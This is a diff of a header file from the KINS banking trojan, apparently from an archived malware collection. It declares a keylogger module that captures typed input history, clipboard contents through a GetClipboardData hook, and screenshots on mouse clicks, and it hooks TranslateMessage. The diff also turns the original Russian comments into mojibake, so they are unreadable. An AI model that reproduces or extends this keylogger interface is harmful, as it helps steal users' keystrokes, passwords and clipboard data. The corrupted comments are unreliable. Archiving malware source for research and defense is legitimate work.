@@ -1,5 +1,16 @@
 /*
-  Перехват ввода пользователя.
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
+/*
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 #pragma once
 
@@ -7,39 +18,39 @@ namespace UserHook
 {
 #if BO_KEYLOGGER > 0
   /*
-    Инициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void uninit(void);
   
   /*
-    Очистка буфера ввода пользователя.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   void clearInput(void);
 
   /*
-    Получение текущей истории ввода.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-    OUT buffer - буфер, необходимо освободить через Mem.
+    OUT buffer - пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mem.
 
-    Return     - 0 - если буфер пусть, *buffer будет равен NULL.
-                 >0 - размер buffer в символах, исключая нулевой символ.
+    Return     - 0 - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, *buffer пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ NULL.
+                 >0 - пїЅпїЅпїЅпїЅпїЅпїЅ buffer пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   */
   DWORD getInput(LPWSTR *buffer);
 
   void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
   
   /*
-    Перехватчик TranslateMessage.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TranslateMessage.
   */
   BOOL WINAPI hookerTranslateMessage(const MSG *msg);
 
   /*
-    Перехватчик GetClipboardData.
+    пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetClipboardData.
   */
   HANDLE WINAPI hookerGetClipboardData(UINT format);
 
